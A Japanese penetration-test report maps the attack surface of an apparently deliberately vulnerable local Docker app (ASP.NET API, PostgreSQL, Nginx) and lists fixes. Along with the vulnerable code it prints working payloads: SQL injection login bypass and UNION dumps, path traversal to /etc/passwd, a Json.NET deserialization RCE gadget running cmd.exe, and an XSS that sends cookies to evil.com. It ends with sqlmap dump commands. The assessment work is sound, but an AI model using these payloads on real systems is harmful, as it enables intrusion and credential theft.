# アタックサーフェース定義レポート

> **実施日時**: 2026-02-08 09:30:00 UTC  
> **診断フェーズ**: 02-Attack Surface Mapping（アタックサーフェース定義）  
> **前工程レポート**: /docker-work-dir/docs/reports/01-情報収集.md  
> **対象**: ローカルネットワーク内のDocker Compose環境

---

## 1. アタックサーフェースサマリー

### 1.1 概要図

```
外部アクセス層
    ├─ localhost:3000 ────────┐
    ├─ localhost:5000 ────────┼─ 公開エンドポイント
    └─ localhost:15432 ───────┘ ⚠️ DBポート直接公開（Critical）

Docker ネットワーク内部
    ┌──────────────────────────────────────────┐
    │  Frontend (Nginx:80)                     │
    │  - 静的ファイル配信                       │
    │  - /api/* → API へリバースプロキシ        │
    │  ⚠️ root権限実行                         │
    │  ⚠️ セキュリティヘッダ欠如                │
    └──────────┬───────────────────────────────┘
               │ Nginx Proxy
               ↓
    ┌──────────────────────────────────────────┐
    │  API (ASP.NET Core:5000)                 │
    │  - 8個のAPIエンドポイント                 │
    │  - SQLインジェクション（全エンドポイント） │
    │  - 認証・認可なし                         │
    │  - CORS: AllowAnyOrigin                  │
    │  - Development モード                    │
    │  ⚠️ root権限実行                         │
    └──────────┬───────────────────────────────┘
               │ Npgsql (SSL無効)
               ↓
    ┌──────────────────────────────────────────┐
    │  Database (PostgreSQL:5432)              │
    │  - 1テーブル: users                      │
    │  - パスワード平文保存                     │
    │  - 弱い認証情報                           │
    │  ⚠️ ポート15432で外部公開                │
    └──────────────────────────────────────────┘
```

### 1.2 攻撃面の統計

| カテゴリ | 項目数 | リスク評価 |
|---------|--------|-----------|
| **公開ポート** | 3 | High（DB直接公開） |
| **APIエンドポイント** | 8 | Critical（全て脆弱） |
| **入力フォーム** | 5 | High（XSS, SQLi） |
| **認証不要エンドポイント** | 8 | Critical（全て認証なし） |
| **SQLインジェクション箇所** | 6 | Critical |
| **ハードコード秘匿情報** | 4 | High |
| **XSS脆弱性** | 1 | High |
| **デシリアライズ脆弱性** | 1 | Critical |
| **ディレクトリトラバーサル** | 1 | High |

### 1.3 攻撃面の重大度分布

| 重大度 | 件数 | 割合 |
|--------|------|------|
| **Critical** | 12 | 50% |
| **High** | 8 | 33% |
| **Medium** | 4 | 17% |
| **合計** | 24 | 100% |

---

## 2. ネットワーク層アタックサーフェース

### 2.1 公開ポート一覧

| ポート | サービス | プロトコル | 内部ポート | 必要性 | リスク評価 | 説明 |
|--------|---------|-----------|-----------|--------|-----------|------|
| **15432** | PostgreSQL | TCP | db:5432 | ❌ 不要 | **Critical** | ⚠️ DBポートが外部公開 - 直接攻撃可能 |
| **5000** | ASP.NET Core API | HTTP | api:5000 | ⭕ 必要 | **High** | REST API - 認証なし、SQLi脆弱性 |
| **3000** | Nginx | HTTP | frontend:80 | ⭕ 必要 | **Medium** | フロントエンド配信 - セキュリティヘッダ欠如 |

**重大な懸念事項**:
- **データベースポート15432の外部公開**: PostgreSQL直接アクセスが可能で、弱い認証情報（`postgres/postgres123`）により侵入リスクが非常に高い
- **SSL/TLS未使用**: 全ての通信が平文で行われる（DB接続含む）
- **認証機構の欠如**: API層に認証が存在せず、全エンドポイントに自由にアクセス可能

### 2.2 サービス間通信経路

#### 2.2.1 外部 → Frontend

```
外部ユーザー
    ↓ HTTP (平文)
Nginx (frontend:80)
```

**攻撃面**:
- HTTPのみ（HTTPSなし）
- セキュリティヘッダの欠如（X-Frame-Options, CSP等）
- オープンリダイレクト脆弱性

#### 2.2.2 Frontend → API

```
Nginx (frontend:80)
    ↓ Reverse Proxy
ASP.NET Core API (api:5000)
```

**攻撃面**:
- CORS: AllowAnyOrigin → CSRF攻撃が可能
- 認証ヘッダの欠如
- CSRFトークンなし

#### 2.2.3 API → Database

```
ASP.NET Core API (api:5000)
    ↓ Npgsql (SSL Mode=Disable)
PostgreSQL (db:5432)
```

**攻撃面**:
- SSL無効 → 中間者攻撃（MITM）が可能
- パラメータ化クエリ未使用 → SQLインジェクション
- 接続文字列にパスワードハードコード

#### 2.2.4 外部 → Database（直接）

```
外部攻撃者
    ↓ TCP 15432 (平文)
PostgreSQL (db:5432)
```

**攻撃面**:
- **⚠️ Critical**: 外部から直接DBアクセス可能
- 弱い認証情報（`postgres/postgres123`）
- ブルートフォース攻撃に対する防御なし

### 2.3 ネットワークセキュリティ設定

| 項目 | 設定値 | リスク |
|-----|--------|-------|
| **Dockerネットワーク** | デフォルトブリッジ | Medium: 分離不十分 |
| **コンテナ実行ユーザー** | root（全サービス） | High: 権限昇格リスク |
| **ファイアウォール** | なし | High: ポート制限なし |
| **レート制限** | なし | High: DDoS/ブルートフォース対策なし |

---

## 3. アプリケーション層アタックサーフェース

### 3.1 フロントエンド攻撃面

#### 3.1.1 ルーティング

| パス | 機能 | 入力パラメータ | 攻撃面 |
|------|------|--------------|-------|
| `/` | ユーザー一覧 | `?redirect=` | **F-03**: オープンリダイレクト |
| `/users/:id` | ユーザー詳細 | `id` | **F-01**: XSS（dangerouslySetInnerHTML） |
| `/users/new` | ユーザー追加 | フォーム入力 | SQLi（バックエンド）, パスワード平文送信 |
| `/users/:id/edit` | ユーザー編集 | フォーム入力 | Mass Assignment, SQLi |
| `/login` | ログイン | フォーム入力 | SQLi, 平文PW送信, localStorage保存 |

#### 3.1.2 入力フォーム一覧

| フォーム | 入力フィールド | バリデーション | サニタイゼーション | リスク |
|---------|--------------|--------------|------------------|-------|
| **ユーザー検索** | `search` | ❌ なし | ❌ なし | **Critical**: SQLi |
| **ユーザー作成** | `username`, `email`, `password`, `role`, `profileImageUrl` | ❌ なし | ❌ なし | **Critical**: SQLi, XSS, Mass Assignment |
| **ユーザー編集** | `username`, `email`, `password`, `role`, `profileImageUrl` | ❌ なし | ❌ なし | **Critical**: SQLi, XSS, Mass Assignment |
| **ログイン** | `username`, `password` | ❌ なし | ❌ なし | **Critical**: SQLi, 認証バイパス |

#### 3.1.3 クライアントサイドセキュリティ

**ハードコードされた秘匿情報** (`src/frontend/src/config.ts`):
```typescript
export const INTERNAL_API_KEY = 'sk-vuln-app-secret-key-12345';
export const ADMIN_PANEL_URL = 'http://internal-admin.local:8080';
```

**脆弱性 F-02**: APIキー・内部URLがクライアントコードに埋め込まれ、ブラウザから容易に取得可能

**コンソールログへの機密情報出力** (`src/frontend/src/api.ts`):
```typescript
debugLog('login attempt', { username, password });  // パスワードがコンソールに出力
```

**脆弱性 F-05**: パスワード、APIレスポンス全体がブラウザコンソールに出力される

**localStorage への平文保存** (`src/frontend/src/pages/Login.tsx`):
```typescript
localStorage.setItem('user', JSON.stringify(result.user));  // パスワード含む
```

**脆弱性 F-05**: ユーザー情報（パスワード含む）がlocalStorageに平文保存

#### 3.1.4 サードパーティライブラリ

| ライブラリ | バージョン | 既知の脆弱性 | 状態 |
|-----------|-----------|------------|------|
| React | 19.2.0 | なし | ✅ 最新 |
| React Router DOM | 7.13.0 | なし | ✅ 最新 |
| Vite | 7.2.4 | なし | ✅ 最新 |
| TypeScript | 5.9.3 | なし | ✅ 最新 |

**分析結果**: フロントエンド依存パッケージは最新版で既知の脆弱性なし

### 3.2 WebAPI攻撃面

#### 3.2.1 エンドポイント一覧

| # | メソッド | パス | 認証 | 入力検証 | SQLパラメータ化 | エラー処理 | リスク評価 | 脆弱性ID |
|---|---------|------|------|---------|---------------|-----------|-----------|---------|
| 1 | GET | `/api/users` | ❌ | ❌ | ❌ | 詳細露出 | **Critical** | A-01 (SQLi) |
| 2 | GET | `/api/users/{id}` | ❌ | ❌ | ❌ | 詳細露出 | **High** | A-01 (SQLi) |
| 3 | POST | `/api/users` | ❌ | ❌ | ❌ | 詳細露出 | **Critical** | A-01, A-03, A-06 |
| 4 | PUT | `/api/users/{id}` | ❌ | ❌ | ❌ | 詳細露出 | **Critical** | A-01, A-03, A-06 |
| 5 | DELETE | `/api/users/{id}` | ❌ | ❌ | ❌ | 詳細露出 | **Critical** | A-02 |
| 6 | POST | `/api/login` | ❌ | ❌ | ❌ | 詳細露出 | **Critical** | A-01, A-03, A-08, A-09 |
| 7 | GET | `/api/files/{*filePath}` | ❌ | ❌ | N/A | 詳細露出 | **Critical** | A-07 |
| 8 | POST | `/api/import` | ❌ | ❌ | N/A | 詳細露出 | **Critical** | A-10 |

**統計**:
- 認証が必要なエンドポイント: **0 / 8**
- 入力検証を実施: **0 / 8**
- パラメータ化クエリ使用: **0 / 6**（SQL使用箇所）
- 安全なエラー処理: **0 / 8**

#### 3.2.2 脆弱なコード箇所

##### A-01: SQLインジェクション

**箇所1**: `UsersController.cs` - GetAll() (行37-42)
```csharp
// 脆弱性 A-01: searchパラメータを文字列連結でSQL構築
var sql = "SELECT ... FROM users";
if (!string.IsNullOrEmpty(search))
{
    sql += $" WHERE username LIKE '%{search}%' OR email LIKE '%{search}%'";
}
```

**攻撃ペイロード例**:
```
GET /api/users?search=' OR '1'='1' -- 
```

**箇所2**: `UsersController.cs` - Create() (行104-106)
```csharp
// 脆弱性 A-01: 全フィールドが文字列連結
var sql = $@"INSERT INTO users (username, email, password, role, profile_image_url)
             VALUES ('{user.Username}', '{user.Email}', '{user.Password}', '{user.Role}', '{user.ProfileImageUrl}')";
```

**攻撃ペイロード例**:
```json
{
  "username": "attacker', 'attacker@evil.com', 'pwd', 'admin', ''); --",
  "email": "dummy",
  "password": "dummy"
}
```

**箇所3**: `AuthController.cs` - Login() (行40)
```csharp
// 脆弱性 A-01: ログイン認証バイパス
var sql = $"SELECT ... FROM users WHERE username = '{request.Username}' AND password = '{request.Password}'";
```

**攻撃ペイロード例**:
```json
{
  "username": "admin' --",
  "password": "anything"
}
```

##### A-02: 認証バイパス

**箇所**: `UsersController.cs` - Delete() (全体)
```csharp
// 脆弱性 A-02: 認証チェックなし
[HttpDelete("{id}")]
public async Task<IActionResult> Delete(int id)
{
    // 認証・認可の確認なし
    var sql = $"DELETE FROM users WHERE id = {id}";
    // ...
}
```

**攻撃シナリオ**: 管理者アカウント（id=1）を誰でも削除可能

##### A-03: パスワード平文保存

**箇所1**: データベーススキーマ (`db/init.sql`)
```sql
CREATE TABLE users (
    password VARCHAR(255) NOT NULL  -- ハッシュ化なし
);
```

**箇所2**: `UsersController.cs` - Create(), Update()
```csharp
// パスワードをそのままDB保存
VALUES ('{user.Username}', '{user.Email}', '{user.Password}', ...)
```

##### A-04: 詳細エラー情報の露出

**箇所**: 全コントローラー
```csharp
catch (Exception ex)
{
    // スタックトレース全体を返却
    return StatusCode(500, new { error = ex.Message, stackTrace = ex.StackTrace });
}
```

**露出情報**: ファイルパス、内部構造、データベーススキーマ等

##### A-05: CORS設定の不備

**箇所**: `Program.cs` (行11-19)
```csharp
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        policy.AllowAnyOrigin()      // 全オリジン許可
              .AllowAnyMethod()
              .AllowAnyHeader();
    });
});
```

**影響**: CSRF攻撃、悪意のあるサイトからのAPI呼び出しが可能

##### A-06: Mass Assignment

**箇所**: `UsersController.cs` - Create(), Update()
```csharp
[HttpPost]
public async Task<IActionResult> Create([FromBody] User user)
{
    // roleフィールドが直接バインド → 一般ユーザーが管理者権限を取得可能
    VALUES (..., '{user.Role}', ...)
}
```

**攻撃ペイロード**:
```json
{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "pass123",
  "role": "admin"  // 管理者権限を自己付与
}
```

##### A-07: ディレクトリトラバーサル

**箇所**: `FileController.cs` - GetFile() (行32)
```csharp
[HttpGet("files/{*filePath}")]
public IActionResult GetFile(string filePath)
{
    // パスバリデーションなし
    var fullPath = Path.Combine("/app/uploads", filePath);
    var bytes = System.IO.File.ReadAllBytes(fullPath);
    return File(bytes, "application/octet-stream");
}
```

**攻撃ペイロード例**:
```
GET /api/files/../../etc/passwd
GET /api/files/../../app/appsettings.json
```

##### A-08: HTTPヘッダインジェクション

**箇所**: `AuthController.cs` - Login() (行59-60)
```csharp
// ユーザー入力をヘッダに直接出力
Response.Headers.Append("X-User-Role", user.Role);
Response.Headers.Append("X-Username", user.Username);
```

**攻撃ペイロード例**:
```json
{
  "username": "attacker\r\nX-Admin: true",
  "password": "anything' OR '1'='1' --"
}
```

##### A-09: レート制限の欠如

**箇所**: 全エンドポイント（特にログインAPI）
```csharp
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    // レート制限なし → ブルートフォース攻撃が可能
}
```

**攻撃シナリオ**: 辞書攻撃・総当たり攻撃で全パスワードを試行可能

##### A-10: 安全でないデシリアライズ

**箇所**: `FileController.cs` - Import() (行56-61)
```csharp
[HttpPost("import")]
public IActionResult Import([FromBody] object data)
{
    var settings = new JsonSerializerSettings
    {
        TypeNameHandling = TypeNameHandling.All  // ⚠️ RCE脆弱性
    };
    var result = JsonConvert.DeserializeObject(json, settings);
}
```

**攻撃ペイロード例** (Remote Code Execution):
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  },
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c calc.exe"]
  }
}
```

#### 3.2.3 APIセキュリティ機構の不足

| セキュリティ機構 | 実装状況 | リスク |
|---------------|---------|-------|
| **認証** | ❌ なし | Critical: 全エンドポイントが無防備 |
| **認可** | ❌ なし | Critical: ロール制御なし |
| **入力検証** | ❌ なし | Critical: SQLi, XSS等が容易 |
| **出力エンコーディング** | ❌ なし | High: XSS脆弱性 |
| **レート制限** | ❌ なし | High: DDoS, ブルートフォース攻撃 |
| **CSRFトークン** | ❌ なし | High: CSRF攻撃可能 |
| **セキュリティヘッダ** | ❌ なし | Medium: クリックジャッキング等 |
| **監査ログ** | ❌ なし | Medium: インシデント調査不可 |

### 3.3 データベース攻撃面

#### 3.3.1 テーブル構造

**テーブル**: `users`

| カラム | 型 | 制約 | セキュリティ評価 |
|--------|------|------|---------------|
| `id` | SERIAL | PRIMARY KEY | ✅ 安全 |
| `username` | VARCHAR(100) | NOT NULL | ⚠️ ユニーク制約なし |
| `email` | VARCHAR(255) | NOT NULL | ⚠️ ユニーク制約なし、形式検証なし |
| `password` | VARCHAR(255) | NOT NULL | ❌ **Critical**: 平文保存 |
| `role` | VARCHAR(50) | NOT NULL, DEFAULT 'user' | ⚠️ ENUM型未使用 |
| `profile_image_url` | TEXT | DEFAULT '' | ⚠️ URL検証なし（XSS脆弱性） |
| `created_at` | TIMESTAMP | DEFAULT NOW() | ✅ 安全 |
| `updated_at` | TIMESTAMP | DEFAULT NOW() | ✅ 安全 |

**脆弱性**:
- パスワードカラムにハッシュ化なし
- ユニーク制約欠如 → 重複ユーザー登録可能
- CHECK制約なし → 不正データ挿入可能

#### 3.3.2 初期データ（シードデータ）

**ファイル**: `src/db/seed.sql`

| ユーザー名 | パスワード | ロール | 脆弱性評価 |
|-----------|----------|-------|-----------|
| admin | admin123 | admin | ❌ **Critical**: 予測可能な管理者パスワード |
| tanaka | password | user | ❌ **Critical**: 最も一般的な弱いパスワード |
| suzuki | 123456 | user | ❌ **Critical**: 数字のみの弱いパスワード |
| sato | qwerty | user | ❌ **Critical**: キーボード配列の弱いパスワード |
| yamada | letmein | user | ❌ **Critical**: 一般的な英単語 |

**リスク**: パスワードリストによるブルートフォース攻撃で即座に侵入可能

#### 3.3.3 データベース接続設定

**ファイル**: `docker-compose.yml` (行41)

```yaml
ConnectionStrings__DefaultConnection: "Host=db;Port=5432;Database=vulndb;Username=postgres;Password=postgres123;SSL Mode=Disable"
```

**脆弱性**:
- **I-02**: パスワードが環境変数にハードコード
- **D-03**: SSL無効 → 中間者攻撃が可能
- **D-01**: 弱いパスワード（postgres123）

#### 3.3.4 データベース権限

**設定**:
```yaml
POSTGRES_USER: postgres  # スーパーユーザー
POSTGRES_PASSWORD: postgres123
```

**脆弱性 D-02**: アプリケーションがスーパーユーザー権限で接続
- テーブル削除・作成が可能
- 全データベースへのアクセス可能
- システムテーブルの変更可能

**推奨**: 最小権限原則に基づく専用アプリユーザーの作成

---

## 4. インフラ層アタックサーフェース

### 4.1 Docker Compose設定

**ファイル**: `docker-compose.yml`

#### 4.1.1 ハードコードされた秘匿情報

| 箇所 | 秘匿情報 | 脆弱性ID | リスク |
|-----|---------|---------|-------|
| `db.environment.POSTGRES_PASSWORD` | `postgres123` | I-02, D-01 | Critical |
| `api.environment.ConnectionStrings__DefaultConnection` | パスワード含む接続文字列 | I-02, D-03 | Critical |
| フロントエンド `config.ts` | `sk-vuln-app-secret-key-12345` | F-02 | High |
| フロントエンド `config.ts` | `http://internal-admin.local:8080` | F-02 | Medium |

**推奨**: 環境変数ファイル（.env）またはDocker Secretsの使用

#### 4.1.2 ポートマッピング

```yaml
db:
  ports:
    - "15432:5432"  # ⚠️ Critical: DB直接公開
api:
  ports:
    - "5000:5000"   # ⚠️ High: 認証なしAPI公開
frontend:
  ports:
    - "3000:80"     # ⚠️ Medium: HTTP公開（HTTPS推奨）
```

**脆弱性 I-03**: データベースポートが外部に不必要に公開

### 4.2 Dockerfile設定

#### 4.2.1 API Dockerfile

**ファイル**: `src/api/Dockerfile`

```dockerfile
FROM mcr.microsoft.com/dotnet/aspnet:10.0-preview
WORKDIR /app
COPY --from=build /app/publish .
RUN mkdir -p /app/uploads
ENV ASPNETCORE_ENVIRONMENT=Development  # ⚠️ A-04: 本番環境で開発モード
ENTRYPOINT ["dotnet", "VulnApi.dll"]    # ⚠️ I-01: rootユーザー実行
```

**脆弱性**:
- **I-01**: USERディレクティブなし → root権限で実行
- **A-04**: 開発モードが環境変数で固定 → スタックトレース露出

#### 4.2.2 Frontend Dockerfile

**ファイル**: `src/frontend/Dockerfile`

```dockerfile
FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]  # ⚠️ I-01: rootユーザー実行
```

**脆弱性 I-01**: USERディレクティブなし → root権限で実行

**権限昇格リスク**: コンテナ侵入時にroot権限が奪取される

### 4.3 Nginx設定

**ファイル**: `src/frontend/nginx.conf`

```nginx
server {
    listen 80;
    server_name localhost;
    
    location / {
        root /usr/share/nginx/html;
        index index.html;
        try_files $uri $uri/ /index.html;
    }
    
    location /api/ {
        proxy_pass http://api:5000/api/;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

**欠如しているセキュリティヘッダ**:
- `X-Frame-Options: DENY` → クリックジャッキング対策
- `X-Content-Type-Options: nosniff` → MIME Sniffing対策
- `Content-Security-Policy` → XSS緩和策
- `Strict-Transport-Security` → HTTPS強制（HTTPSの場合）
- `Referrer-Policy` → リファラー情報制御

### 4.4 コンテナセキュリティ

| 項目 | 設定 | リスク評価 | 推奨対策 |
|-----|------|-----------|---------|
| **実行ユーザー** | root（全コンテナ） | **High** | 非rootユーザーで実行 |
| **Capabilities** | デフォルト | Medium | 不要な権限を削除 |
| **Read-only filesystem** | 未設定 | Medium | 読み取り専用FS使用 |
| **Security Options** | 未設定 | Medium | AppArmorまたはSeccomp使用 |
| **リソース制限** | 未設定 | Low | CPU/メモリ制限設定 |

---

## 5. OWASP Top 10 (2021) マッピング

### 5.1 A01:2021 - Broken Access Control

| 脆弱性ID | 箇所 | 説明 | 重大度 |
|---------|------|------|-------|
| **A-02** | 全APIエンドポイント | 認証機構の完全な欠如 | Critical |
| **A-06** | POST/PUT `/api/users` | Mass Assignment - roleフィールドの不正操作 | Critical |
| **F-03** | フロントエンド `UserList.tsx` | オープンリダイレクト (`?redirect=`) | High |

**推定攻撃シナリオ**:
1. 一般ユーザーがrole="admin"を指定してユーザー作成
2. 管理者権限で他ユーザーを削除
3. データベース直接アクセスでデータ改ざん

### 5.2 A02:2021 - Cryptographic Failures

| 脆弱性ID | 箇所 | 説明 | 重大度 |
|---------|------|------|-------|
| **A-03** | データベース `users.password` | パスワード平文保存 | Critical |
| **D-03** | DB接続設定 | SSL/TLS未使用（SSL Mode=Disable） | High |
| **D-04** | `seed.sql` | 初期ユーザーの弱いパスワード平文保存 | Critical |
| **F-05** | `Login.tsx` | パスワード含むユーザー情報をlocalStorageに平文保存 | High |

**データ露出リスク**:
- 全ユーザーのパスワードがDB侵害時に即座に露出
- ネットワークスニッフィングで認証情報取得可能
- ブラウザアクセスでパスワード取得可能

### 5.3 A03:2021 - Injection

| 脆弱性ID | 箇所 | 説明 | 重大度 |
|---------|------|------|-------|
| **A-01** | GET `/api/users?search=` | SQLインジェクション（searchパラメータ） | Critical |
| **A-01** | POST `/api/users` | SQLインジェクション（全フィールド） | Critical |
| **A-01** | PUT `/api/users/{id}` | SQLインジェクション（全フィールド） | Critical |
| **A-01** | POST `/api/login` | SQLインジェクション（username, password） | Critical |
| **A-01** | GET `/api/users/{id}` | SQLインジェクション（idパラメータ）※ | High |

※ idはint型だが、文字列連結を使用しているため理論上は脆弱

**検証優先度**: 最高（全データ取得・改ざん・削除が可能）

### 5.4 A04:2021 - Insecure Design

| 脆弱性ID | 箇所 | 説明 | 重大度 |
|---------|------|------|-------|
| **A-04** | `Program.cs` | 開発者例外ページの本番環境での有効化 | High |
| **I-03** | `docker-compose.yml` | データベースポートの外部公開設計 | Critical |
| **F-04** | API呼び出し | CSRF対策の完全な欠如 | High |
| **A-09** | 全エンドポイント | レート制限・監査ログなしの設計 | High |

**設計上の根本的な問題**: セキュリティが設計段階で考慮されていない

### 5.5 A05:2021 - Security Misconfiguration

| 脆弱性ID | 箇所 | 説明 | 重大度 |
|---------|------|------|-------|
| **A-05** | `Program.cs` | CORS: AllowAnyOrigin設定 | High |
| **A-04** | Dockerfile (API) | ASPNETCORE_ENVIRONMENT=Development固定 | High |
| **I-01** | 全Dockerfile | root権限での実行 | High |
| **D-01** | `docker-compose.yml` | 弱いデータベースパスワード | Critical |
| **Nginx** | `nginx.conf` | セキュリティヘッダの完全な欠如 | Medium |

### 5.6 A06:2021 - Vulnerable and Outdated Components

| コンポーネント | バージョン | 既知脆弱性 | 評価 |
|-------------|-----------|-----------|------|
| PostgreSQL | 16-alpine | なし | ✅ 最新 |
| .NET | 10.0-preview | Preview版（本番非推奨） | ⚠️ Medium |
| Npgsql | 9.0.3 | なし | ✅ 最新 |
| Newtonsoft.Json | 13.0.3 | **TypeNameHandling脆弱性（A-10）** | ❌ **Critical** |
| React | 19.2.0 | なし | ✅ 最新 |
| Nginx | alpine | なし | ✅ 最新 |

**注意**: Newtonsoft.Jsonは最新版だが、`TypeNameHandling.All`設定により脆弱

### 5.7 A07:2021 - Identification and Authentication Failures

| 脆弱性ID | 箇所 | 説明 | 重大度 |
|---------|------|------|-------|
| **A-02** | 全APIエンドポイント | 認証機構の完全な欠如 | Critical |
| **A-03** | ログイン処理 | パスワード平文比較 | Critical |
| **A-08** | `/api/login` | HTTPヘッダインジェクション | High |
| **A-09** | `/api/login` | ブルートフォース対策なし | High |
| **D-04** | シードデータ | 全ユーザーの弱いパスワード | Critical |

**認証バイパス方法**:
1. SQLインジェクションでログイン認証を回避
2. 直接APIエンドポイントを呼び出し（認証不要）
3. データベース直接アクセス（ポート15432）

### 5.8 A08:2021 - Software and Data Integrity Failures

| 脆弱性ID | 箇所 | 説明 | 重大度 |
|---------|------|------|-------|
| **A-10** | POST `/api/import` | TypeNameHandling.All によるRCE脆弱性 | Critical |
| **I-02** | `docker-compose.yml` | 秘匿情報のハードコード | High |
| **F-02** | `config.ts` | APIキー・内部URLのクライアント埋め込み | High |

**Remote Code Execution**: A-10により任意のコード実行が可能

### 5.9 A09:2021 - Security Logging and Monitoring Failures

| 脆弱性ID | 箇所 | 説明 | 重大度 |
|---------|------|------|-------|
| **A-09** | 全システム | 監査ログの完全な欠如 | High |
| **F-05** | `api.ts` | パスワード等の機密情報をコンソールログ出力 | High |
| - | 全エンドポイント | ログイン試行・API呼び出しの記録なし | High |

**影響**: 攻撃の検知・インシデント調査が不可能

### 5.10 A10:2021 - Server-Side Request Forgery (SSRF)

| 脆弱性ID | 箇所 | 説明 | 重大度 |
|---------|------|------|-------|
| **潜在的リスク** | `profile_image_url` | URL検証なし → 内部サービスへのリクエスト可能性 | Medium |
| **A-07** | `/api/files/{*filePath}` | ディレクトリトラバーサル（間接的なSSRF） | High |

**検証が必要**: profile_image_url経由でのSSRF可能性

---

## 6. 優先度付き攻撃面一覧

### 6.1 Critical（緊急対応必須）

| # | 攻撃面 | カテゴリ | 脆弱性ID | 推定リスク | 検証優先度 | 推奨対策 |
|---|--------|---------|---------|-----------|-----------|---------|
| 1 | データベースポート外部公開 | インフラ | I-03 | データベース侵害 | **最高** | ポート15432を削除 |
| 2 | SQLインジェクション（全エンドポイント） | アプリ | A-01 | 全データ漏洩・改ざん | **最高** | パラメータ化クエリ |
| 3 | 認証機構の完全な欠如 | アプリ | A-02 | 無制限アクセス | **最高** | JWT等の認証実装 |
| 4 | パスワード平文保存 | データ | A-03, D-04 | 認証情報漏洩 | **最高** | bcrypt/Argon2導入 |
| 5 | 安全でないデシリアライズ（RCE） | アプリ | A-10 | サーバー完全侵害 | **最高** | TypeNameHandling無効化 |
| 6 | Mass Assignment（権限昇格） | アプリ | A-06 | 管理者権限不正取得 | **最高** | DTOパターン導入 |
| 7 | 弱いDBパスワード | インフラ | D-01 | DB直接侵入 | **最高** | 強力なパスワード設定 |

### 6.2 High（速やかな対応必須）

| # | 攻撃面 | カテゴリ | 脆弱性ID | 推定リスク | 検証優先度 | 推奨対策 |
|---|--------|---------|---------|-----------|-----------|---------|
| 8 | XSS（dangerouslySetInnerHTML） | フロント | F-01 | アカウント乗っ取り | **高** | DOMPurify使用 |
| 9 | ディレクトリトラバーサル | アプリ | A-07 | 任意ファイル読取 | **高** | パス検証実装 |
| 10 | HTTPヘッダインジェクション | アプリ | A-08 | レスポンス操作 | **高** | ヘッダ値検証 |
| 11 | ハードコード秘匿情報 | インフラ | I-02 | 認証情報漏洩 | **高** | 環境変数化 |
| 12 | SSL/TLS未使用 | インフラ | D-03 | 中間者攻撃 | **高** | SSL有効化 |
| 13 | CORS設定不備 | アプリ | A-05 | CSRF攻撃 | **高** | オリジン制限 |
| 14 | root権限実行 | インフラ | I-01 | 権限昇格 | **高** | 非rootユーザー使用 |
| 15 | レート制限なし | アプリ | A-09 | ブルートフォース | **高** | レート制限実装 |

### 6.3 Medium（計画的に対応）

| # | 攻撃面 | カテゴリ | 脆弱性ID | 推定リスク | 検証優先度 | 推奨対策 |
|---|--------|---------|---------|-----------|-----------|---------|
| 16 | 詳細エラー情報の露出 | アプリ | A-04 | 情報漏洩 | **中** | 一般的エラーメッセージ |
| 17 | オープンリダイレクト | フロント | F-03 | フィッシング | **中** | リダイレクト先検証 |
| 18 | CSRF対策の欠如 | フロント | F-04 | 不正操作 | **中** | CSRFトークン実装 |
| 19 | コンソールログ機密情報出力 | フロント | F-05 | 情報漏洩 | **中** | ログ削除・マスキング |
| 20 | セキュリティヘッダ欠如 | インフラ | - | クリックジャッキング等 | **中** | ヘッダ追加 |

---

## 7. 攻撃シナリオ例

### 7.1 シナリオ1: データベース完全侵害

**攻撃手順**:
1. `localhost:15432` に直接PostgreSQL接続
2. `postgres/postgres123` で認証
3. 全テーブルのダンプ（パスワード平文取得）
4. 管理者アカウントで不正ログイン
5. データベース改ざん

**必要スキル**: 低  
**所要時間**: 5分未満  
**影響**: Critical

### 7.2 シナリオ2: SQLインジェクション経由の侵害

**攻撃手順**:
1. ログイン画面で `username = admin' --` を入力
2. パスワード検証をバイパスして管理者としてログイン
3. API経由で全ユーザーデータを取得
4. `search` パラメータでUNION攻撃
5. データベーススキーマ情報を取得

**必要スキル**: 中  
**所要時間**: 15分  
**影響**: Critical

**実際のペイロード**:
```
GET /api/users?search=' UNION SELECT id,username,password,email,role,'',NOW(),NOW() FROM users WHERE '1'='1
```

### 7.3 シナリオ3: Mass Assignment → 権限昇格

**攻撃手順**:
1. ユーザー登録時に `role: "admin"` を指定
2. 管理者権限で他ユーザーを削除
3. データベース直接操作で完全制御

**ペイロード**:
```json
POST /api/users
{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "Pass123!",
  "role": "admin"
}
```

**必要スキル**: 低  
**所要時間**: 3分  
**影響**: Critical

### 7.4 シナリオ4: Remote Code Execution (RCE)

**攻撃手順**:
1. `/api/import` エンドポイントに悪意のあるJSONを送信
2. `TypeNameHandling.All` を悪用してObjectDataProviderを構築
3. システムコマンドを実行
4. リバースシェル確立

**ペイロード** (簡略版):
```json
POST /api/import
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```

**必要スキル**: 高  
**所要時間**: 30分  
**影響**: Critical（サーバー完全侵害）

### 7.5 シナリオ5: XSS → セッションハイジャック

**攻撃手順**:
1. ユーザー作成時に `profileImageUrl` に以下を設定:
   ```html
   <img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">
   ```
2. 他ユーザーがそのプロフィールを閲覧
3. cookieが攻撃者サーバーに送信される
4. セッション乗っ取り

**必要スキル**: 中  
**所要時間**: 10分  
**影響**: High

---

## 8. 次フェーズへの推奨事項

### 8.1 スキャニングフェーズ（フェーズ03）での検証項目

#### 優先度1: Critical脆弱性の検証

1. **sqlmap** - SQLインジェクション検証
   ```bash
   sqlmap -u "http://api:5000/api/users?search=test" --batch --dump
   sqlmap -u "http://api:5000/api/login" --data='{"username":"admin","password":"test"}' --method=POST
   ```

2. **Nmap** - ポートスキャンとDB直接アクセス検証
   ```bash
   nmap -p 15432 localhost
   psql -h localhost -p 15432 -U postgres -d vulndb
   ```

